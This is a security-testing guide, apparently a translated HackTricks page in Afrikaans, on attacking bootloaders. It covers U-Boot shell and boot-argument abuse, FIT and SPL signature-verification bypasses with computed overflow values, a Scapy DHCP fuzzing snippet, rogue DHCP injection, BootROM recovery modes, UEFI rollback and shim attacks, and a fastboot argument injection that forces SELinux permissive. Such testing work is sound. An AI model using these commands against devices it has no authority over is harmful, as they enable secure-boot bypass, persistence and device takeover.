# Bootloader-toetsing

{{#include ../../banners/hacktricks-training.md}}

Die volgende stappe word aanbeveel om toestel se opstartkonfigurasies te wysig en bootloaders soos U-Boot en UEFI-klas-laaiers te toets. Fokus daarop om vroeë kode-uitvoering te kry, handtekening-/terugdraai-beskerming te beoordeel en herstel- of netwer kopstartpaaie te misbruik.

Verwant: MediaTek-veilige-opstart-omseiling via bl2_ext-patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: vinnige oorwinnings en omgewingsmisbruik

1. Kry toegang tot die interpreteerder-shell
   - Druk tydens opstart ’n bekende onderbrekingsleutel (dikwels enige sleutel, 0, spasie of ’n bordspesifieke "magic"-volgorde) voordat `bootcmd` uitgevoer word, om na die U-Boot-prompt te gaan.<sup>[[1]](#references)</sup>

2. Inspekteer opstarttoestand en veranderlikes
   - Nuttige opdragte:
     - `printenv` (stort omgewing)
     - `bdinfo` (bordinligting, geheueadresse)
     - `help bootm; help booti; help bootz` (ondersteunde kern-opstartmetodes)
     - `help ext4load; help fatload; help tftpboot` (beskikbare laaiers)

3. Wysig opstartargumente om ’n root-shell te kry
   - Voeg `init=/bin/sh` by sodat die kern na ’n shell gaan in plaas van normale init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot vanaf jou TFTP-bediener
   - Stel die netwerk op en haal ’n kernel/fit-image vanaf die LAN af:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Maak veranderinge permanent via die omgewing
   - As env-berging nie skryfbeskerm is nie, kan jy beheer permanent behou:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Kyk vir veranderlikes soos `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` wat terugvalpaaie beïnvloed. Verkeerd gekonfigureerde waardes kan herhaalde toegang tot die shell moontlik maak.

6. Gaan debug-/onveilige funksies na
   - Soek na: `bootdelay` > 0, `autoboot` gedeaktiveer, onbeperkte `usb start; fatload usb 0:1 ...`, die vermoë om `loady`/`loads` via serial te gebruik, `env import` vanaf onbetroubare media, en kernels/ramdisks wat sonder handtekeningkontroles gelaai word.

7. U-Boot-beeld-/verifikasietoetsing
   - As die platform beweer dat dit veilige/verifieerde boot met FIT-beelde gebruik, probeer beide ongetekende en gepeuterde beelde:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Die afwesigheid van `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` of die ou `verify=n`-gedrag laat dikwels toe dat arbitrêre loonvragte gelaai word.
   - Moenie by ’n eenvoudige toelaat/afkeur-uitslag stop nie: onlangse FIT-navorsing het getoon dat die verifikasiepad self ’n aanvalsvlak voor verifikasie kan wees. Toets eksterne FIT-data (`data-offset`, `data-position`, `data-size`), keuse van ondertekende konfigurasie, `loadables` en die hantering van oorlegsels / `extra-conf` negatief.
   - As jy ’n ooreenstemmende bronboom het, is `test/vboot/vboot_test.sh` ’n vinnige manier om FIT-verifikasiegedrag in U-Boot sandbox te reproduseer voordat jy aan werklike hardeware raak.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` en script-bootvloeie
   - In moderne U-Boot-bouweergawes is `bootcmd` dikwels net ’n omhulsel om Standard Boot. Dit beteken skryfbare media, PXE of SPI-flitsgeheue kan die werklike vertrouensgrens word, selfs wanneer die sigbare omgewing onskuldig lyk.
   - Die `extlinux`-bootmeth soek na `extlinux/extlinux.conf` onder `/` en `/boot`; die script-bootmeth soek eers na `boot.scr.uimg` en daarna na `boot.scr`. By netwerkselflaai kan die script-lêernaam van `boot_script_dhcp` kom.
   - Nuttige voorlopige ondersoek-opdragte:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Misbruikgevalle om te toets: aanvaller-beheerde USB/SD-media vroeër in `boot_targets`, skryfbare `/boot/extlinux/extlinux.conf`, rogue TFTP wat `boot.scr` verskaf, of script-uitvoering via SPI deur `script_offset_f`.
   - As die platform op FIT-verifikasie staatmaak, maak seker dat konfigurasies op konfigurasievlak onderteken word en nie net per image nie; `required-mode=all` is sterker as om enige enkele vereiste sleutel te aanvaar.

### SPL-eksterne FIT-data wat voor verifikasie gekopieer word

Vir SPL FIT-laaiwerk maak ’n ongeskonde konfigurasiehandtekening nie metadata oor eksterne payloads veilig nie. U-Boot sluit `data-position`, `data-offset` en `data-size` uit ondertekende konfigurasie-eienskappe uit. In geraakte `load_simple_fit()`-paaie lei SPL ’n bron-offset en kopielengte van hierdie velde af, en roep dan `info->read()` **voor** die image-hash nagegaan word. ’n Geskoorde FIT op skryfbare selflaaimedia kan dus RAM oorskryf sonder om ’n handtekening te vervals. Die ondertekende `load`-eienskap bepaal gewoonlik die bestemming, so bepaal eers of ’n oorgroot kopie vanaf daardie adres die stack of ander beheerdata kan bereik.<sup>[[15]](#references)[[16]](#references)</sup>

Spoor die bord se werklike laaier en geheuekaart na in plaas daarvan om ’n flash-lesing te veronderstel: die gedemonstreerde RAM-laaier het `spl_ram_load_read()` en `memcpy()` bereik. Teken by die oproeppunt `fit_offset` en enige FIT-basisadres wat deur die leser bygevoeg word, die laaier se bloklengte (`spl_get_bl_len(info)`), enige fork-spesifieke belyning, die resulterende `read_offset` en oordrag-`size`, bestemmings-`src_ptr` en die ligging van die gestoorde returnadres aan. Kontroleer of ’n aaneenlopende, gemapte bronstreek die vereiste kopieerafstand dek, of dit die bestemming oorvleuel, en of grepe by die bronposisie ’n wyser na aanvaller-beheerde FIT-data kan verskaf. Die generiese [tegniek vir gedeeltelike oorskryf van die returnadres](../../binary-exploitation/stack-overflow/ret2win/) is van toepassing as ’n volledige wyser nie aan die laaier se belyningsbeperkings kan voldoen nie.<sup>[[16]](#references)</sup>

In die navorsers se 32-bis AST2600-toetsbou was `src_ptr` `0x80001000` en `memcpy` se gestoorde returnadres by `0x902ffe24`. Hulle het ’n upstream-bou gebruik wat met OpenBMC se stack-plasings- en belyningshelpers gewysig is: die RAM-leser het ’n FIT-basis van `0x10000` bygevoeg, en dié helpers het die bron-offset na onder afgerond tot `ARCH_DMA_MINALIGN` (64 grepe). ’n Nuttige little-endian-wyser by `0x902fffe4` en ’n kopie wat een greep korter eindig, het net die laagste drie grepe van die gestoorde returnadres verander en die bekende nul-hoëgreep behou. Die upstream RAM-laaier gebruik egter ’n bloklengte van een greep, dus is hierdie 64-greep-belyning en gedeeltelike-oorskryf-ompad nie algemene SPL-vereistes nie. Lei die adresse, laaierbloklengte en kopie-omvang vir elke bou weer af. In die oorspronklike berekening hieronder dui `fit_offset` op die effektiewe FIT-basisbyvoeging deur die RAM-leser, nie noodwendig die argument wat aan `load_simple_fit()` deurgegee word nie.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Die upstream-regstelling beperk sowel die rou `data-size` as die **blokbelynde** oordraggrootte voordat `info->read()` aangeroep word. Die overlay-pad gee die werklike buffergrootte deur, terwyl ander aanroepers `CONFIG_SYS_BOOTM_LEN` gebruik, wat slegs ’n ruim boonste limiet is en nie bewys dat die bestemming soveel vrye geheue het nie. Wanneer jy ’n verskaffervurk beoordeel, verifieer dat daardie kontroles teenwoordig is en vergelyk die toegelate kopieerreeks met die bord se werklike SPL-stapel en gereserveerde streke.<sup>[[15]](#references)[[16]](#references)</sup>

## Netwerkselflaai-aanvalsoppervlak (DHCP/PXE) en skelm bedieners

9. Fuzzing van PXE/DHCP-parameters
   - U-Boot se verouderde BOOTP/DHCP-hantering het geheueveiligheidskwessies gehad. CVE‑2024‑42040 beskryf byvoorbeeld geheuelekkasie via vervaardigde DHCP-antwoorde wat grepe uit U-Boot-geheue oor die netwerk kan uitlek.<sup>[[4]](#references)</sup> Toets die DHCP/PXE-kodepaaie met buitensporig lang of randgevalwaardes (opsie 67 bootfile-name, verskafferopsies, file/servername-velde) en let op vir hangende prosesse of leaks.
   - Minimale Scapy-brokkie om selflaaiparameters tydens netboot te stres:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valideer ook of PXE-lêernaamvelde sonder sanitisering aan shell-/loader-logika deurgegee word wanneer dit aan OS-kant aan voorsieningskrifte gekoppel is.

10. Toetsing van opdrag-inspuiting via ’n Rogue DHCP-bediener
   - Stel ’n rogue DHCP/PXE-diens op en probeer karakters in lêernaam- of opsievelde inspuit om opdraginterpreteerders in latere stadiums van die selflaaiketting te bereik. Metasploit se DHCP auxiliary, `dnsmasq` of pasgemaakte Scapy-skrifte werk goed. Maak seker dat jy eers die labnetwerk isoleer.

## SoC ROM-herstelmodusse wat normale selflaai oorheers

Baie SoC’s stel ’n BootROM-“loader”-modus beskikbaar wat kode oor USB/UART aanvaar, selfs wanneer flitsbeelde ongeldig is. As secure-boot-fuses nie geblaas is nie, kan dit baie vroeg in die ketting arbitrêre kode-uitvoering moontlik maak.

- NXP i.MX (Serial Download Mode)
  - Gereedskap: `uuu` (mfgtools3) of `imx-usb-loader`.
  - Voorbeeld: `imx-usb-loader u-boot.imx` om ’n pasgemaakte U-Boot vanaf RAM te laai en uit te voer.
- Allwinner (FEL)
  - Gereedskap: `sunxi-fel`.
  - Voorbeeld: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` of `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Gereedskap: `rkdeveloptool`.
  - Voorbeeld: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` om ’n loader te laai en ’n pasgemaakte U-Boot op te laai.

Bepaal of die toestel se secure-boot eFuses/OTP geblaas is. Indien nie, omseil BootROM-aflaaimodusse dikwels enige hoërvlakverifikasie (U-Boot, kernel, rootfs) deur jou eerstefase-loonvrag direk vanaf SRAM/DRAM uit te voer.

## UEFI/PC-klas-selflaailaaiers: vinnige kontroles

11. Toetsing van ESP-peutering, terugrol en sleutelregistrasie
   - Monteer die EFI System Partition (ESP) en kyk vir loader-komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, verskaffer-logo-paaie.
   - Stort die Secure Boot-toestand en sleuteldatabasisse vanaf die OS, indien moontlik:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - As die platform in Setup Mode is, ongemagtigde sleutelregistrasie aanvaar, of met ’n toets-/standaard Platform Key (PKfail-klas) gelewer word, kan ’n plaaslike admin of fisiese aanvaller hul eie KEK/db registreer en Secure Boot steeds as “enabled” laat vertoon terwyl willekeurige EFI-binaries gelaai word.<sup>[[3]](#references)</sup>
   - Probeer om met afgegradeerde of bekende kwesbare, ondertekende opstartkomponente te begin as Secure Boot-herroepings (dbx) nie op datum is nie. As die platform steeds ou shims/bootmanagers vertrou, kan jy dikwels jou eie kernel of `grub.cfg` vanaf die ESP laai om volharding te verkry.
   - Op Windows kan reggemaakte gashere steeds kwesbare, ondertekende bootmanagers aanvaar as die `Microsoft Windows Production PCA 2011`-ondertekenaar nie in firmware se `dbx` voorkom nie, soos met BlackX waargeneem is.<sup>[[13]](#references)[[14]](#references)</sup> ’n Baton Drop-styl omseiling kan ’n aanvaller se MOK registreer; ’n wettige shim kan dan tydens latere opstart ’n EFI-payload laai wat deur daardie sleutel onderteken is.<sup>[[12]](#references)[[13]](#references)</sup> As die ou Windows-ondertekenaar later herroep word, verwyder dit nie die geregistreerde MOK nie, dus kan die shim-gebaseerde pad voortduur as daardie shim steeds vertrou word.<sup>[[12]](#references)</sup>
   - Voordat jy hierdie terugrolpad op ’n gemagtigde UEFI-masjien toets, gaan die **effektiewe firmware-herroepingstoestand** na, nie net die Windows-opdateringsgeskiedenis nie.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft verskaf hierdie leesalleen PowerShell-kontrole met verhoogde regte vir die 2011-ondertekenaar in `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` is slegs ’n leidraad: bevestig die spesifieke ondertekende selflaaikomponent en ander herroepings in ’n herstelbare laboratorium.<sup>[[12]](#references)[[14]](#references)</sup> ’n Hangende registeropdatering of ’n vervalde ondertekeningsertifikaat is nie gelykstaande aan ’n voltooide `dbx`-herroeping nie.<sup>[[13]](#references)[[14]](#references)</sup>

12. Stale shim / SBAT / dbx revocation testing
   - Ou Microsoft-ondertekende shims en verskaffervurke kan steeds as ’n BYOVD-agtige selflaaikit-roete dien as herroepings verouderd is. Plaas in ’n geïsoleerde laboratorium ’n histories kwesbare shim op die ESP en probeer om jou eie `grubx64.efi` of kern te kettinglaai.<sup>[[11]](#references)</sup>
   - Vinnige triage:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - As die shim steeds loop ondanks dat dit op die herroepingslys is, het die firmware/OS verouderde `dbx`-opdaterings of vertrou dit ’n gevurkte loader wat nooit stroomop-SBAT-beskerming geërf het nie.

13. Foute met ontleding van selflaailogo's (LogoFAIL-klas)
   - Verskeie OEM/IBV-firmwareweergawes was kwesbaar vir beeldontledingsfoute in DXE wat selflaailogo's verwerk. As ’n aanvaller ’n vervaardigde beeld op die ESP onder ’n verskafferspesifieke pad (bv. `\EFI\<vendor>\logo\*.bmp`) kan plaas en herlaai, kan code execution tydens vroeë selflaai moontlik wees, selfs met Secure Boot geaktiveer. Toets of die platform logo's wat deur gebruikers voorsien word, aanvaar en of daardie paaie vanaf die OS skryfbaar is.<sup>[[2]](#references)</sup>


## Vertrouensgapings in Android/Qualcomm ABL + GBL (Android 16)

Op Android 16-toestelle wat Qualcomm se ABL gebruik om die **Generic Bootloader Library (GBL)** te laai, valideer of ABL die UEFI-app **outentiseer** wat dit vanaf die `efisp`-partisie laai. As ABL slegs nagaan of ’n UEFI-app **teenwoordig** is en nie handtekeninge verifieer nie, word ’n write primitive na `efisp` **pre-OS unsigned code execution** tydens selflaai.<sup>[[6]](#references)[[7]](#references)</sup>

Praktiese kontroles en misbruikroetes:

- **efisp write primitive**: Jy benodig ’n manier om ’n pasgemaakte UEFI-app in `efisp` te skryf (root/bevoorregte diens, OEM-appfout, recovery/fastboot-roete). Sonder dit is die GBL-laaigaping nie direk bereikbaar nie.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL-fout): Sommige bouweergawes aanvaar ekstra tokens in `fastboot oem set-gpu-preemption` en voeg dit by die kernel cmdline. Dit kan gebruik word om permissive SELinux af te dwing, wat skryf na beskermde partisies moontlik maak:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  As die toestel gepatch is, behoort die opdrag ekstra argumente te verwerp.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader-ontsluiting via persistent flags**: ’n Boot-stage payload kan persistent unlock flags (bv. `is_unlocked=1`, `is_unlocked_critical=1`) verander om `fastboot oem unlock` na te boots sonder OEM-bediener-/goedkeuringsvereistes. Dit is ’n duursame houdingsverandering ná die volgende herlaai.<sup>[[6]](#references)</sup>

Defensiewe/notas vir triage:

- Bevestig of ABL handtekeningverifikasie op die GBL/UEFI-payload vanaf `efisp` uitvoer. Indien nie, beskou `efisp` as ’n hoërisiko-persistentie-aanvalsoppervlak.
- Volg op of ABL fastboot OEM-handlers gepatch is om **argumentaantalle te valideer** en bykomende tokens te verwerp.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardeware-waarskuwing

Wees versigtig wanneer jy tydens vroeë opstart met SPI/NAND-flitsgeheue werk (bv. deur penne te aard om leesbewerkings te omseil), en raadpleeg altyd die flitsgeheue se datablad. Kortsluitings op die verkeerde tyd kan die toestel of die programmeerder beskadig.

## Notas en bykomende wenke

- Probeer `env export -t ${loadaddr}` en `env import -t ${loadaddr}` om omgewingsblobs tussen RAM en berging te verskuif; sommige platforms laat toe dat env vanaf verwyderbare media ingevoer word sonder verifikasie.
- Vir persistentie op Linux-gebaseerde stelsels wat via `extlinux.conf` opstart, is die wysiging van die `APPEND`-reël (om `init=/bin/sh` of `rd.break` in te voeg) op die opstartpartisie dikwels voldoende wanneer geen handtekeningkontroles afgedwing word nie.
- As die teiken dual-slot-/A/B-opdaterings gebruik, gaan die anti-rollback- en slot-desync-tegnieke in die [oorsig van firmware-ontleding](README.md) na sodat jy nie updater-only trust gaps buite die bootloader self miskyk nie.
- As userland `fw_printenv/fw_setenv` verskaf, bevestig dat `/etc/fw_env.config` met die werklike env-berging ooreenstem. Verkeerd ingestelde offsets laat jou toe om die verkeerde MTD-streek te lees/skryf.

## References

- [1] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: Die gevare van beeldontleding tydens stelselopstart](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Onbetroubare platformsleutels ondermyn Secure Boot in die UEFI-ekosisteem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040-besonderhede](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Xiaomi ontsluit met twee ongesuiwerde strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL-exploit laat aanvallers bootloaders ontsluit](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generiese Bootloader (GBL)-argitektuur](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Maak die deurvoer van onbetroubare insette na die kernel-opdragreël reg](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Voeg ’n kontrole vir die set-hw-fence-value-opdrag by](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: Breek U-Boot se FIT-handtekeningverifikasie](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Kennisgewing oor kwesbaarheid VU#616257 - Microsoft-ondertekende UEFI-shim-bootloaders kwesbaar vir Secure Boot-omseiling](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI-bootkit: Mite bevestig](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: ’n BlackLotus-agtige UEFI-bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Hoe om Windows Boot Manager-herroepings vir Secure Boot-veranderinge te bestuur](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [U-Boot-pleister: Beperk die grootte van eksterne data voordat dit gelees word](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Hidden beneFITs: Omseiling van handtekeningverifikasie in U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
